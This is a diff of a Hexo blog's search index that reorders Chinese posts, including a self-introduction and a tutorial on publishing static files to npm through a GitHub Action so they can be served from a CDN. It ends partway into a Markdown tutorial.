@@ -1,100 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>利用GitHub Action自动发布你的静态资源到npm</title>
-    <url>/posts/action-npm/</url>
-    <content><![CDATA[<p>苦于GitHub Page和Vercel的本地资源加载速度，我和<a href="https://felixchen0707.cn/">Felix</a>一直在寻找各种静态资源的公共CDN。然而这些资源并不能很好满足我们的需求，因此想到利用npm包在国内的镜像来作为我们所需静态资源的CDN。我们同时想将这些静态资源托管在GitHub并发布到npm，这样一来手动操作就效率极低。<span id="more"></span>懒，也就成了这篇文章的第一驱动力。</p>
-<div class="story post-story"><h2 id="注册npm并生成token"><a href="#注册npm并生成token" class="headerlink" title="注册npm并生成token"></a>注册npm并生成token</h2><div class="tag link"><a class="link-card" title="npm注册界面" href="https://www.npmjs.com/signup"><div class="left"><img src="https://static.npmjs.com/7a7ffabbd910fc60161bc04f2cee4160.png" class="lazyload" data-srcset="https://static.npmjs.com/7a7ffabbd910fc60161bc04f2cee4160.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">npm注册界面</p><p class="url">https://www.npmjs.com/signup</p></div></a></div>
-
-<p>点击链接进入npm注册界面，注册一个账号。</p>
-<p>按下图所示生成一个token，并记录下来：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a4644abd622.png" data-fancybox="one" data-caption="点击头像，Access Tokens"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a4644abd622.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a4644abd622.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="点击头像，Access Tokens"></a><span class="image-caption">点击头像，Access Tokens</span></div></div>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a4644b378b4.png" data-fancybox="one" data-caption="点击Generate New Token"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a4644b378b4.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a4644b378b4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="点击Generate New Token"></a><span class="image-caption">点击Generate New Token</span></div></div>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a4644bcef72.png" data-fancybox="one" data-caption="填一个备注，选择automation，点击generate"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a4644bcef72.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a4644bcef72.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="填一个备注，选择automation，点击generate"></a><span class="image-caption">填一个备注，选择automation，点击generate</span></div></div>
-<p>这里一定要选择Automation，否则之后执行Action需要进行验证。</p>
-</div><div class="story post-story"><h2 id="GitHub仓库配置"><a href="#GitHub仓库配置" class="headerlink" title="GitHub仓库配置"></a>GitHub仓库配置</h2><h3 id="新建workflow"><a href="#新建workflow" class="headerlink" title="新建workflow"></a>新建workflow</h3><p>新建一个GitHub仓库，配置自己任意选择即可。<br>新建一个Action：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a464485c707.png" data-fancybox="one" data-caption="新建workflow"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a464485c707.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a464485c707.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="新建workflow"></a><span class="image-caption">新建workflow</span></div></div>
-<p>将以下代码复制到这个yml文件当中：</p>
-<figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Publish</span> <span class="string">to</span> <span class="string">npm</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line"><span class="comment"># 检测到有push则执行action</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">publish-to-npm:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">release</span> <span class="string">branch</span> <span class="string">code</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Use</span> <span class="string">Node.js</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@master</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">${{</span> <span class="string">matrix.node-version</span> <span class="string">}}</span></span><br><span class="line">          <span class="attr">registry-url:</span> <span class="string">https://registry.npmjs.org</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Publish</span> <span class="string">to</span> <span class="string">NPM</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">publish</span> <span class="string">||</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">NODE_AUTH_TOKEN:</span> <span class="string">${{</span> <span class="string">secrets.NPM_TOKEN</span> <span class="string">}}</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-<p>点击<code>start commit</code></p>
-<h3 id="配置npm的token"><a href="#配置npm的token" class="headerlink" title="配置npm的token"></a>配置npm的token</h3><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a464492d844.png" data-fancybox="one" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a464492d844.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a464492d844.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a46449f22a4.png" data-fancybox="one" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a46449f22a4.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a46449f22a4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div>
-<p><code>Name</code>填写<code>NPM_TOKEN</code>，<code>Value</code>填写你刚刚在npm获取的token</p>
-</div><div class="story post-story"><h2 id="本地修改并push至GitHub仓库"><a href="#本地修改并push至GitHub仓库" class="headerlink" title="本地修改并push至GitHub仓库"></a>本地修改并push至GitHub仓库</h2><p>电脑环境要求：<a href="https://nodejs.org/en/">Nodejs</a>，<a href="https://git-scm.com/downloads">Git</a>。如果没有的话还请自行搜索安装。<br>在某一个目录下打开Git Bash，输入以下命令</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:[UserName]/[RepoName].git</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/[UserName]/[RepoName].git</span><br></pre></td></tr></tbody></table></figure>
-
-<p><code>UserName</code>为你的用户名，<code>RepoName</code>为方才创建的仓库名。</p>
-<p>完成这一步之后需要对仓库进行npm的初始化：</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></tbody></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>参数名</th>
-<th>参数值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>package name</td>
-<td>不能和npm已有包名重复，建议使用用户名-仓库名的方式避免重复</td>
-</tr>
-<tr>
-<td>version</td>
-<td>版本号，默认即可</td>
-</tr>
-<tr>
-<td>description</td>
-<td>对包的描述</td>
-</tr>
-<tr>
-<td>entry point</td>
-<td>默认即可</td>
-</tr>
-<tr>
-<td>test command</td>
-<td>默认即可</td>
-</tr>
-<tr>
-<td>git repository</td>
-<td>对应的Git仓库地址，默认</td>
-</tr>
-<tr>
-<td>keywords</td>
-<td>关键词，可留空</td>
-</tr>
-<tr>
-<td>author</td>
-<td>包的作者，可以写你的用户名</td>
-</tr>
-<tr>
-<td>license</td>
-<td>默认即可</td>
-</tr>
-</tbody></table>
-<p>输入完成后将为你生成<code>package.json</code>文件，输入yes后，在当前目录下可以看到。</p>
-<p>接下来将你想要上传的文件复制到这个目录里来。在命令行输入：</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 将当前目录下的所有更改添加到缓存</span></span><br><span class="line">git add .</span><br><span class="line"><span class="comment"># 提交更改</span></span><br><span class="line">git commit -m <span class="string">"描述"</span></span><br><span class="line"><span class="comment"># 更新package版本号</span></span><br><span class="line">npm version patch</span><br><span class="line"><span class="comment"># 推送至github触发action</span></span><br><span class="line">git push</span><br></pre></td></tr></tbody></table></figure>
-
-<p>等待push完成后，可以在GitHub检查一下Action是否成功运行，如果成功运行，npm将会给你发邮件通知包的发布情况。</p>
-</div><div class="story post-story"><h2 id="查看资源"><a href="#查看资源" class="headerlink" title="查看资源"></a>查看资源</h2><p>例如我创建的包名为<code>bf-static</code>，在相应的根目录下我创建了一个<code>logo.png</code>。我可以通过以下链接进行访问：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#unpkg</span><br><span class="line">https://unpkg.com/bf-static/logo.png</span><br><span class="line">#eleme国内镜像</span><br><span class="line">https://npm.elemecdn.com/bf-static/logo.png</span><br></pre></td></tr></tbody></table></figure>
-
-<p>相应地改成你的包名、文件路径和文件名即可。</p>
-</div><div class="story post-story"><h2 id="示例仓库"><a href="#示例仓库" class="headerlink" title="示例仓库"></a>示例仓库</h2><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/BowenYoung/BF-static"><img src="https://github-readme-stats.vercel.app/api/pin/?username=BowenYoung&amp;repo=BF-static&amp;theme=algolia&amp;show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=BowenYoung&amp;repo=BF-static&amp;theme=algolia&amp;show_owner=true" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a>
-<p>觉得本文或者仓库资源不错，也可以给仓库点个🌟</p>
-
-</div>]]></content>
-      <categories>
-        <category>白嫖</category>
-      </categories>
-      <tags>
-        <tag>npm</tag>
-        <tag>GitHub</tag>
-        <tag>Action</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>《深入理解计算机系统》第7章：链接 阅读报告</title>
     <url>/posts/csapp-7/</url>
     <content><![CDATA[<p>这篇文章是阅读《深入理解计算机系统》第7章：链接后写下的，很多地方写得并不详细，也无法保证完全正确。主要是为了记录我学习链接相关知识的过程，仅供参考。<span id="more"></span></p>
@@ -329,42 +235,6 @@
       </tags>
   </entry>
   <entry>
-    <title>初来乍到，请多指教！</title>
-    <url>/posts/firstblog/</url>
-    <content><![CDATA[<h1 id="我是谁？"><a href="#我是谁？" class="headerlink" title="我是谁？"></a>我是谁？</h1><span id="more"></span>
-
-<center>我是一名普通大学生、极客爱好者。</center>
-
-<center>是NBA和F1的狂热粉丝。</center>
-
-<center>白日梦是成为一名优秀的（白帽）hacker。</center>
-
-<center>我将在这个网页上更新我的学习经历、生活等。</center>
-
-<center>请多多指教！</center>
-
-<h1 id="为什么搭建这样一个博客？"><a href="#为什么搭建这样一个博客？" class="headerlink" title="为什么搭建这样一个博客？"></a>为什么搭建这样一个博客？</h1><ul>
-<li><p>其实最直接的原因是最近在<a href="https://www.w3school.com.cn/">w3school</a>)学html+css，又偶然间在油管上刷到了利用<a href="https://hexo.io/">hexo</a>和<a href="https://github.com/">github</a>搭建个人博客的视频，脑子一热，就花了一段时间搭建了这个网站。</p>
-</li>
-<li><p>还有一个原因就是为了<del>装杯</del>，毕竟听说学IT的人总归要有个个人博客。<del>技术不行那就先拿博客凑个数</del></p>
-</li>
-<li><p>然后呢就是为了有一个渠道去分享我的一些学习经验和生活吧。更新随缘。</p>
-</li>
-</ul>
-<h1 id="如何联系我"><a href="#如何联系我" class="headerlink" title="如何联系我"></a>如何联系我</h1><ul>
-<li><p><a href="mailto:yys958257943@gamil.com">谷歌邮箱</a></p>
-</li>
-<li><p><a href="https://github.com/BowenYoung">Github主页</a></p>
-</li>
-</ul>
-<p>欢迎所有访客的友好交流和建议哦！</p>
-
-]]></content>
-      <tags>
-        <tag>杂七杂八</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>GitHub个人资料页美化</title>
     <url>/posts/githubBeautify/</url>
     <content><![CDATA[<p>本文介绍如何美化GitHub个人资料页</p>
@@ -469,6 +339,136 @@
       </categories>
       <tags>
         <tag>GitHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初来乍到，请多指教！</title>
+    <url>/posts/firstblog/</url>
+    <content><![CDATA[<h1 id="我是谁？"><a href="#我是谁？" class="headerlink" title="我是谁？"></a>我是谁？</h1><span id="more"></span>
+
+<center>我是一名普通大学生、极客爱好者。</center>
+
+<center>是NBA和F1的狂热粉丝。</center>
+
+<center>白日梦是成为一名优秀的（白帽）hacker。</center>
+
+<center>我将在这个网页上更新我的学习经历、生活等。</center>
+
+<center>请多多指教！</center>
+
+<h1 id="为什么搭建这样一个博客？"><a href="#为什么搭建这样一个博客？" class="headerlink" title="为什么搭建这样一个博客？"></a>为什么搭建这样一个博客？</h1><ul>
+<li><p>其实最直接的原因是最近在<a href="https://www.w3school.com.cn/">w3school</a>)学html+css，又偶然间在油管上刷到了利用<a href="https://hexo.io/">hexo</a>和<a href="https://github.com/">github</a>搭建个人博客的视频，脑子一热，就花了一段时间搭建了这个网站。</p>
+</li>
+<li><p>还有一个原因就是为了<del>装杯</del>，毕竟听说学IT的人总归要有个个人博客。<del>技术不行那就先拿博客凑个数</del></p>
+</li>
+<li><p>然后呢就是为了有一个渠道去分享我的一些学习经验和生活吧。更新随缘。</p>
+</li>
+</ul>
+<h1 id="如何联系我"><a href="#如何联系我" class="headerlink" title="如何联系我"></a>如何联系我</h1><ul>
+<li><p><a href="mailto:yys958257943@gamil.com">谷歌邮箱</a></p>
+</li>
+<li><p><a href="https://github.com/BowenYoung">Github主页</a></p>
+</li>
+</ul>
+<p>欢迎所有访客的友好交流和建议哦！</p>
+
+]]></content>
+      <tags>
+        <tag>杂七杂八</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>利用GitHub Action自动发布你的静态资源到npm</title>
+    <url>/posts/action-npm/</url>
+    <content><![CDATA[<p>苦于GitHub Page和Vercel的本地资源加载速度，我和<a href="https://felixchen0707.cn/">Felix</a>一直在寻找各种静态资源的公共CDN。然而这些资源并不能很好满足我们的需求，因此想到利用npm包在国内的镜像来作为我们所需静态资源的CDN。我们同时想将这些静态资源托管在GitHub并发布到npm，这样一来手动操作就效率极低。<span id="more"></span>懒，也就成了这篇文章的第一驱动力。</p>
+<div class="story post-story"><h2 id="注册npm并生成token"><a href="#注册npm并生成token" class="headerlink" title="注册npm并生成token"></a>注册npm并生成token</h2><div class="tag link"><a class="link-card" title="npm注册界面" href="https://www.npmjs.com/signup"><div class="left"><img src="https://static.npmjs.com/7a7ffabbd910fc60161bc04f2cee4160.png" class="lazyload" data-srcset="https://static.npmjs.com/7a7ffabbd910fc60161bc04f2cee4160.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">npm注册界面</p><p class="url">https://www.npmjs.com/signup</p></div></a></div>
+
+<p>点击链接进入npm注册界面，注册一个账号。</p>
+<p>按下图所示生成一个token，并记录下来：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a4644abd622.png" data-fancybox="one" data-caption="点击头像，Access Tokens"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a4644abd622.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a4644abd622.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="点击头像，Access Tokens"></a><span class="image-caption">点击头像，Access Tokens</span></div></div>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a4644b378b4.png" data-fancybox="one" data-caption="点击Generate New Token"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a4644b378b4.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a4644b378b4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="点击Generate New Token"></a><span class="image-caption">点击Generate New Token</span></div></div>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a4644bcef72.png" data-fancybox="one" data-caption="填一个备注，选择automation，点击generate"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a4644bcef72.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a4644bcef72.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="填一个备注，选择automation，点击generate"></a><span class="image-caption">填一个备注，选择automation，点击generate</span></div></div>
+<p>这里一定要选择Automation，否则之后执行Action需要进行验证。</p>
+</div><div class="story post-story"><h2 id="GitHub仓库配置"><a href="#GitHub仓库配置" class="headerlink" title="GitHub仓库配置"></a>GitHub仓库配置</h2><h3 id="新建workflow"><a href="#新建workflow" class="headerlink" title="新建workflow"></a>新建workflow</h3><p>新建一个GitHub仓库，配置自己任意选择即可。<br>新建一个Action：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a464485c707.png" data-fancybox="one" data-caption="新建workflow"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a464485c707.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a464485c707.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="新建workflow"></a><span class="image-caption">新建workflow</span></div></div>
+<p>将以下代码复制到这个yml文件当中：</p>
+<figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Publish</span> <span class="string">to</span> <span class="string">npm</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line"><span class="comment"># 检测到有push则执行action</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">publish-to-npm:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">release</span> <span class="string">branch</span> <span class="string">code</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Use</span> <span class="string">Node.js</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@master</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">${{</span> <span class="string">matrix.node-version</span> <span class="string">}}</span></span><br><span class="line">          <span class="attr">registry-url:</span> <span class="string">https://registry.npmjs.org</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Publish</span> <span class="string">to</span> <span class="string">NPM</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">publish</span> <span class="string">||</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">NODE_AUTH_TOKEN:</span> <span class="string">${{</span> <span class="string">secrets.NPM_TOKEN</span> <span class="string">}}</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>点击<code>start commit</code></p>
+<h3 id="配置npm的token"><a href="#配置npm的token" class="headerlink" title="配置npm的token"></a>配置npm的token</h3><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a464492d844.png" data-fancybox="one" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a464492d844.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a464492d844.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/11/62a46449f22a4.png" data-fancybox="one" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/11/62a46449f22a4.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/11/62a46449f22a4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div>
+<p><code>Name</code>填写<code>NPM_TOKEN</code>，<code>Value</code>填写你刚刚在npm获取的token</p>
+</div><div class="story post-story"><h2 id="本地修改并push至GitHub仓库"><a href="#本地修改并push至GitHub仓库" class="headerlink" title="本地修改并push至GitHub仓库"></a>本地修改并push至GitHub仓库</h2><p>电脑环境要求：<a href="https://nodejs.org/en/">Nodejs</a>，<a href="https://git-scm.com/downloads">Git</a>。如果没有的话还请自行搜索安装。<br>在某一个目录下打开Git Bash，输入以下命令</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:[UserName]/[RepoName].git</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/[UserName]/[RepoName].git</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>UserName</code>为你的用户名，<code>RepoName</code>为方才创建的仓库名。</p>
+<p>完成这一步之后需要对仓库进行npm的初始化：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></tbody></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数名</th>
+<th>参数值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>package name</td>
+<td>不能和npm已有包名重复，建议使用用户名-仓库名的方式避免重复</td>
+</tr>
+<tr>
+<td>version</td>
+<td>版本号，默认即可</td>
+</tr>
+<tr>
+<td>description</td>
+<td>对包的描述</td>
+</tr>
+<tr>
+<td>entry point</td>
+<td>默认即可</td>
+</tr>
+<tr>
+<td>test command</td>
+<td>默认即可</td>
+</tr>
+<tr>
+<td>git repository</td>
+<td>对应的Git仓库地址，默认</td>
+</tr>
+<tr>
+<td>keywords</td>
+<td>关键词，可留空</td>
+</tr>
+<tr>
+<td>author</td>
+<td>包的作者，可以写你的用户名</td>
+</tr>
+<tr>
+<td>license</td>
+<td>默认即可</td>
+</tr>
+</tbody></table>
+<p>输入完成后将为你生成<code>package.json</code>文件，输入yes后，在当前目录下可以看到。</p>
+<p>接下来将你想要上传的文件复制到这个目录里来。在命令行输入：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 将当前目录下的所有更改添加到缓存</span></span><br><span class="line">git add .</span><br><span class="line"><span class="comment"># 提交更改</span></span><br><span class="line">git commit -m <span class="string">"描述"</span></span><br><span class="line"><span class="comment"># 更新package版本号</span></span><br><span class="line">npm version patch</span><br><span class="line"><span class="comment"># 推送至github触发action</span></span><br><span class="line">git push</span><br></pre></td></tr></tbody></table></figure>
+
+<p>等待push完成后，可以在GitHub检查一下Action是否成功运行，如果成功运行，npm将会给你发邮件通知包的发布情况。</p>
+</div><div class="story post-story"><h2 id="查看资源"><a href="#查看资源" class="headerlink" title="查看资源"></a>查看资源</h2><p>例如我创建的包名为<code>bf-static</code>，在相应的根目录下我创建了一个<code>logo.png</code>。我可以通过以下链接进行访问：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#unpkg</span><br><span class="line">https://unpkg.com/bf-static/logo.png</span><br><span class="line">#eleme国内镜像</span><br><span class="line">https://npm.elemecdn.com/bf-static/logo.png</span><br></pre></td></tr></tbody></table></figure>
+
+<p>相应地改成你的包名、文件路径和文件名即可。</p>
+</div><div class="story post-story"><h2 id="示例仓库"><a href="#示例仓库" class="headerlink" title="示例仓库"></a>示例仓库</h2><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/BowenYoung/BF-static"><img src="https://github-readme-stats.vercel.app/api/pin/?username=BowenYoung&amp;repo=BF-static&amp;theme=algolia&amp;show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=BowenYoung&amp;repo=BF-static&amp;theme=algolia&amp;show_owner=true" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a>
+<p>觉得本文或者仓库资源不错，也可以给仓库点个🌟</p>
+
+</div>]]></content>
+      <categories>
+        <category>白嫖</category>
+      </categories>
+      <tags>
+        <tag>GitHub</tag>
+        <tag>npm</tag>
+        <tag>Action</tag>
       </tags>
   </entry>
   <entry>
@@ -734,162 +734,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Markdown进阶教程（以Typora为例）</title>
-    <url>/posts/mdlearn2/</url>
-    <content><![CDATA[<p><a id="1">此篇博客是进阶教程</a><br>建议零基础小白先食用：<a href="https://bowenyoung.cn/posts/mdLearn/">基础教程</a></p>
-<span id="more"></span>
-
-<div class="story post-story"><h2 id="目录写法"><a href="#目录写法" class="headerlink" title="目录写法"></a>目录写法</h2><p>在任意位置添加<code>[TOC]</code>即可显示树状结构文章目录。显示效果可以参考本文目录：下图。</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53bbd6d419.png" data-fancybox="one" data-caption="目录"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53bbd6d419.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53bbd6d419.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="目录"></a><span class="image-caption">目录</span></div></div>
-
-
-
-
-</div><div class="story post-story"><h2 id="锚（跳转）"><a href="#锚（跳转）" class="headerlink" title="锚（跳转）"></a>锚（跳转）</h2><p>有两种方法：</p>
-<ol>
-<li><p>Markdown原生：</p>
